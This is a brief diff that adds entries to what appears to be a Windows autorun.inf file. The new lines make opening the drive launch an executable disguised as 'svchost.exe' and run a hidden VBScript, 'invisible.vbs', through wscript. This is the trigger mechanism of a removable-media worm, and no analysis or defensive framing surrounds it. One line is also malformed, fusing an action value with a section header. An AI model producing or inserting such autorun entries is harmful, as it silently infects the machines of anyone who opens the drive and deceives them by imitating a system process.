@@ -2,3 +2,6 @@
 open=svchost.exe
 action=Run System Process[autorun]
 open=svchost.exe
+action=Start System Service
+shell\open\command=svchost.exe
+shell\open\command=wscript.exe invisible.vbs
